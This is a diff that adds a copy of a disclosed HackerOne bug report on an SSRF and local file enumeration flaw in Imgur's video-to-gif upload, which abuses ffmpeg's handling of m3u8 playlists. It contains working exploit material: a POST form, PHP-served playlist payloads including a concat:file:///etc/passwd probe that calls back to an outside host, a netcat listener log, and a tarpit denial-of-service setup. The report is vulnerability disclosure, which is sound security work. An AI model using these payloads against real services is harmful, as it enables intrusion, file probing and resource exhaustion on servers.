@@ -1,0 +1,138 @@
+ReportLink:https://hackerone.com/reports/115978
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/aesteral
+ReportedTo:Imgur(imgur)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:14.03.2016 17:33:32
+
+Summary:
+
+Hello!
+
+Short description
+========
+
+https://imgur.com/vidgif/upload endpoint is vulnerable to a SSRF/LFE vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and disclose lists of files located on imgur servers including sensitive data.
+
+Why does the vulnerability exist?
+========
+
+imgur allows users to use 'video-to-gif' service. When a user requests conversion of such a video, imgur's servers perform an HTTP HEAD request to a user-supplied URL in order to discover the URL-s content-type and length. After that a user is offered a option to choose the required timestamps for beginning and end of converted video and then imgur performs another HTTP request (GET) to the same video file in order to grab the video file. After imgur downloads the video it evidently performs some sort of operations with ffmpeg (libav). However, ffmpeg has support of several special kinds of files which are not video files but 'playlists'. When processing such playlists ffmpeg performs commands contained and makes HTTP requests to urls listed in such playlists. We will use HTTP Live Streaming playlists (m3u8) in this example.
+
+Although imgur verifies content-types to ignore files which are not actually videos, ffmpeg does not care about such types and will parse a, say, video/avi files with m3u8 lines as a m3u8 file.
+
+Exploits
+========
+Basic SSRF exploit
+--------------
+To launch a basic SSRF we will prepare a php file which replies with video/avi content-type and m3u8 actual content. When parsing such a file, ffmpeg will make an unwanted HTTP GET request to an attacker-supplied URL.
+
+First, lets prepare a POST-dispatcher page:
+
+Request: http://gradeco.ru/imgur/m3u8-dispatch.html
+
+```
+<form action="https://imgur.com/vidgif/upload" method="post">
+<input type="hidden" name="source" value="http://gradeco.ru/imgur/m3u8.php" />
+<input type="hidden" name="url" value="http://gradeco.ru/imgur/m3u8.php" />
+<input type="hidden" name="start" value="0.1" />
+<input type="hidden" name="stop" value="1.0" />
+<input type="submit" />
+</form>
+```
+
+Now, lets prepare a 'video file' with the payload, we use php to supply a fake content-type
+
+Request: http://gradeco.ru/imgur/m3u8.php
+
+```
+<?php
+        header('Content-type: video/avi');
+        header('Content-Length: 1234'); // random content-length, imgur fails if none provided
+?>
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+http://www.gradeco.ru:12346/BASICSSRF // ffmpeg on imgur side will make this request
+#EXT-X-ENDLIST
+```
+
+After ffmpeg parses the m3u8.php file imgur's server makes a request to an attacker's server:
+
+```
+evil.com:# nc -v -l 12346
+Listening on [0.0.0.0] (family 0, port 12346)
+Connection from [54.82.61.224] port 12346 [tcp/*] accepted (family 2, sport 44251)
+GET /BASICSSRF HTTP/1.1
+User-Agent: Lavf/55.48.100
+Accept: */*
+Connection: close
+Host: www.gradeco.ru:12346
+```
+
+We can see our SSRF identification token ('BASICSSRF') present and some information disclosure - lavf version 55.48.100.
+
+Simple local file enumeration exploit
+---------
+
+As we can only perform HTTP GET-s with this vulnerability we have to somehow procure more information. Fortunately, ffmpeg m3u8 support provides us with a useful CONCAT command which allows us to concatenate multiple sources. It also fails if source is not present.
+
+To utilize that lets prepare a new m3u8-2.php file:
+
+```
+<?php
+        header('content-type: video/avi');
+        header('content-length: 1234');
+?>
+#EXTM3U
+#EXT-X-PLAYLIST-TYPE:VOD
+#EXT-X-TARGETDURATION:1
+#EXT-X-VERSION:3
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:file:///etc/passwd|http://gradeco.ru:12346/
+#EXT-X-ENDLIST
+```
+
+If provided with this file, imgur's server will contact gradeco.ru:12346 in case if /etc/passwd exists and won't if it does not exist. In this way an attacker may easily enumerate files.
+
+Denial of service exploit:
+-------
+To perform a denial of service attack an attacker may prepare a specially crafted YUV4 file which will hang ffmpeg and keep it on constantly performing HTTP GET requests. To do so lets create a separate file with a correct m3u8 header:
+
+http://gradeco.ru/imgur/m3u8-head.m3u8
+
+```
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:,
+http://gradeco.ru:12346/?.txt
+```
+
+and a 'video file' 
+
+http://gradeco.ru/imgur/m3u8-dos.php
+
+```
+<?php
+        header('Content-type: video/avi');
+        header('Content-length: 1');
+?>
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://www.gradeco.ru/imgur/m3u8-head.m3u8?2|file:///etc/issue
+#EXT-X-ENDLIST
+```
+
+Redirect port 12346 to TARPIT and then request conversion by sending a following post request:
+
+```
+source: http://gradeco.ru/imgur/m3u8-dos.php
+start: 0.1
+stop: 10
+```
+
+imgur service will request port 12346, end up in TARPIT and then wait forever for 10 seconds of video to be delivered. That means that it will have an open socket and open process which may lead to resource exhaustion.
